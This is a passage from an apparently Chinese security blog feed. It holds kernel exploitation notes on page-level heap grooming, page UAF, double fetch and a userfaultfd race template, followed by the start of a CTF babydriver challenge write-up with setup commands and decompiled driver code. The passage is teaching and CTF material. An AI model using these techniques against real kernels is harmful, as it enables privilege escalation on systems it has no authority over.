class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">goto</span> out_free_pgvec<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>out<span class="token operator">:</span>    <span class="token keyword">return</span> pg_vec<span class="token punctuation">;</span>out_free_pgvec<span class="token operator">:</span>    <span class="token function">free_pg_vec</span><span class="token punctuation">(</span>pg_vec<span class="token punctuation">,</span> order<span class="token punctuation">,</span> block_nr<span class="token punctuation">)</span><span class="token punctuation">;</span>    pg_vec <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 <code>buddy system</code> 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">alloc_one_pg_vec_page</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> order<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span>    <span class="token class-name">gfp_t</span> gfp_flags <span class="token operator">=</span> GFP_KERNEL <span class="token operator">|</span> __GFP_COMP <span class="token operator">|</span>              __GFP_ZERO <span class="token operator">|</span> __GFP_NOWARN <span class="token operator">|</span> __GFP_NORETRY<span class="token punctuation">;</span>    buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>gfp_flags<span class="token punctuation">,</span> order<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span>        <span class="token keyword">return</span> buffer<span class="token punctuation">;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相应地， <code>pgv</code> 中的页面也会在 <code>socket</code> 被关闭后释放：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">packet_release</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">packet_set_ring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">free_pg_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>setsockopt()</code> 也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 <code>buddy system</code> 中的 <code>low order pages</code> 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt()</code> 便<strong>相当于获取到了一块近乎物理连续的内存</strong>（大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 <code>buddy system</code> 的部分页面）</p><h4 id="Page-level-UAF"><a href="#Page-level-UAF" class="headerlink" title="Page-level UAF"></a>Page-level UAF</h4><p>对内存页结构体 <code>page</code> 的释放后利用，例如可以通过内存页重分配的方式将 <code>UAF page</code>分配为指定 <code>kmem_cache</code> 的 <code>slub pages</code> ，从而实现无需任何限制的跨 <code>kmem_cache</code> 的 <code>UAF</code> 利用</p><h2 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h2><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><p>原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争</p><p>用户空间向内核传递数据时，内核通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间，数据复杂时只引用指针</p><p>第一次<code>fetch</code>进行校验及相关处理，将数据暂时保存在用户空间，第二次<code>fetch</code>进行数据实际处理</p><p>在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，造成内核验证通过数据与实际使用数据不一致形成访问越界或缓冲区溢出</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/double-fetch.png" class><h3 id="userfaultfd的使用"><a href="#userfaultfd的使用" class="headerlink" title="userfaultfd的使用"></a>userfaultfd的使用</h3><p><code>userfaultfd</code>是一个<code>linux</code>系统调用，用户可以通过自定义的<code>page fault handler</code>在用户态处理缺页异常，流程如下图</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/userfaultfd.png" class><p>首先要注册一个<code>userfaultfd</code>，通过<code> ioctl</code> 监视一块内存区域，同时启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p><ul><li>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 <code>faulting</code> 线程）进入到内核中处理缺页异常</li><li>内核会调用 <code>handle_userfault()</code> 交由 <code>userfaultfd </code>处理</li><li>随后 <code>faulting</code> 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 <code>monitor</code> 线程，等待其处理结束</li><li><code>monitor</code> 线程调用通过 <code>ioctl</code> 处理缺页异常，有如下选项：<ul><li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 <code>faulting page</code> 上</li><li><code>UFFDIO_ZEROPAGE</code> ：将 <code>faulting page</code> 置 <code>0</code></li><li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li></ul></li><li>在处理结束后 <code>monitor</code> 线程发送信号唤醒 <code>faulting</code> 线程继续工作</li></ul><p>该机制最初被设计来用以进行虚拟机 &#x2F; 进程的迁移等用途，但是<strong>通过这个机制可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong>，比如在如下的操作时：</p><pre class="line-numbers language-none"><code class="language-none">copy_from_user(kptr, user_buf, size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果在进入函数后，实际拷贝开始前线程被中断换下 <code>CPU</code>，别的线程执行，修改了 <code>kptr</code> 指向的内存块的所有权（比如 <code>kfree</code> 掉了这个内存块），然后再执行拷贝时就可以实现 <code>UAF</code>。这种可能性当然是比较小的，但是如果 <code>user_buf</code> 是一个 <code>mmap</code> 的内存块，并且我们为它注册了 <code>userfaultfd</code>，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率</p><p>使用方法：</p><p>在<code>Linux man page</code>当中已经提供了 <code>userfaultfd</code> 的基本使用模板，只需要稍加修改便能直接投入到实战当中，为特定内存注册 <code>userfaultfd monitor</code> 的模板：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error at: \033[0m%s\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">register_userfaultfd</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> <span class="token operator">*</span>monitor_thread<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span>                          <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以直接通过如下操作来为一块匿名的 <code>mmap</code> 内存注册 <code>userfaultfd</code>：</p><pre class="line-numbers language-none"><code class="language-none">register_userfaultfd(thread, addr, len, handler);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是 <code>handler</code> 的写法：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>uffd_src_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 你要拷贝进去的数据</span><span class="token keyword">static</span> <span class="token keyword">long</span> uffd_src_page_size <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token class-name">ssize_t</span> nread<span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>        <span class="token keyword">int</span> nready<span class="token punctuation">;</span>        pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>        pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>        nready <span class="token operator">=</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*         * [在这停顿.jpg]         * 当 poll 返回时说明出现了缺页异常         * 你可以在这里插入一些比如说 sleep() 一类的操作，         * 例如等待其他进程完成对象的重分配后再重新进行拷贝一类的，也可以直接睡死 ：）         */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nready <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"EOF on userfaultfd!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> uffd_src_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span>                                              <span class="token operator">~</span><span class="token punctuation">(</span>uffd_src_page_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> page_size<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="内存中直接搜索flag"><a href="#内存中直接搜索flag" class="headerlink" title="内存中直接搜索flag"></a>内存中直接搜索flag</h3><p><code>Initial RAM disk</code>（<code>initrd</code>）提供了在 <code>boot loader</code> 阶段载入一个 <code>RAM disk</code> 并挂载为根文件系统的能力，从而在该阶段运行一些用户态程序，在完成该阶段工作之后才是挂载真正的根文件系统</p><p><code>initrd</code>文件系统镜像通常为<code>gzip</code>格式，在启动阶段由<code>boot loader</code>将其路径传给<code>kernel</code>，自<code>2.6</code>版本后出现了使用<code>cpio</code>格式的<code>initramfs</code>，从而无需挂载便能展开为一个文件系统</p><p><code>initrd/initramfs</code>的特点是文件系统中的所有内容都会被读取到内存当中，而大部分 <code>CTF</code> 中的 <code>kernel pwn</code> 题目都选择直接将 <code>initrd</code> 作为根文件系统，因此若是我们有内存搜索能力就能直接在内存空间中搜索<code>flag</code>的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;十天速通&lt;code&gt;kernel&lt;/code&gt;基础理论了属于是…画了个思维导图加深一下印象&lt;/p&gt;
&lt;img src=&quot;/2024/03/20/kernel-lou-dong-ji-li-yong/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%A</summary>
      
    
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/categories/kernel/"/>
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_babydriver-kernel_pwn解题一般过程</title>
    <link href="https://starrysky1004.github.io/2024/03/18/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/"/>
    <id>https://starrysky1004.github.io/2024/03/18/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/</id>
    <published>2024-03-18T11:40:04.000Z</published>
    <updated>2024-03-18T13:33:40.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看<code>boot.sh</code>，开启了<code>smep</code>用户代码不可执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 <span class="token punctuation">\</span>        <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>        <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>        <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> <span class="token punctuation">\</span>        <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>        <span class="token parameter variable">-m</span> 128M <span class="token punctuation">\</span>        <span class="token parameter variable">-nographic</span>  <span class="token punctuation">\</span>        <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>        <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>        <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行<code>./boot.sh</code>，查看权限是<code>ctf</code>，需要提权到<code>root</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/ $ <span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span>/ $ <span class="token builtin class-name">cd</span> /home/ctf~ $ <span class="token function">ls</span>~ $ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先解包<code>rootfs.cpio</code>得到驱动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  <span class="token function">mkdir</span> File_system⚡  <span class="token function">mv</span> rootfs.cpio ./File_system/rootfs.cpio.gz⚡  <span class="token builtin class-name">cd</span> File_system⚡  gunzip rootfs.cpio.gz⚡  cpio <span class="token parameter variable">-idmv</span> <span class="token operator">&lt;</span> rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看文件系统里的<code>init</code>文件，发现<code>root</code>权限才能查看<code>flag</code>，内核版本是<code>4.4.72</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod /lib/modules/4.4.72/babydriver.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/babydev<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到<code>ko</code>文件，在<code>File_system/lib/modules/4.4.72/babydriver.ko</code>，查看文件信息，开了<code>NX</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  <span class="token function">file</span> babydriver.ko      babydriver.ko: ELF <span class="token number">64</span>-bit LSB relocatable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped⚡  checksec babydriver.ko     Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析程序，完全没学过，丢给<code>gpt</code>了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">babydriver_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  class <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// 用于存储设备类指针</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  <span class="token comment">// 分配字符设备的主设备号，并将其存储在 babydev_no 变量中</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>babydev_no<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化字符设备 cdev_0，并将其关联的文件操作结构体 fops 设置为 &amp;fops</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将字符设备的所有者指定为当前内核模块</span>    cdev_0<span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token comment">// 向系统添加字符设备 cdev_0，使用分配的主设备号 babydev_no，并指定设备数为1</span>    v1 <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">,</span> babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果添加成功，则返回值大于等于0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">// 创建一个设备类，名称为 "babydev"，并将其与主设备号 babydev_no 相关联</span>      v2 <span class="token operator">=</span> <span class="token punctuation">(</span>class <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_class_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>babydev_no<span class="token punctuation">)</span><span class="token punctuation">;</span>      babydev_class <span class="token operator">=</span> v2<span class="token punctuation">;</span>      <span class="token comment">// 如果设备类创建成功</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">// 在 /dev 目录下创建一个设备节点，名称为 "babydev"，并将其与设备类 v2 和主设备号 babydev_no 相关联</span>        v3 <span class="token operator">=</span> <span class="token function">device_create</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> babydev_no<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">// 如果设备节点创建成功，则返回0</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>          <span class="token keyword">return</span> v0<span class="token punctuation">;</span>        <span class="token comment">// 输出内核信息日志，表示设备节点创建失败</span>        <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_351<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 销毁之前创建的设备类</span>        <span class="token 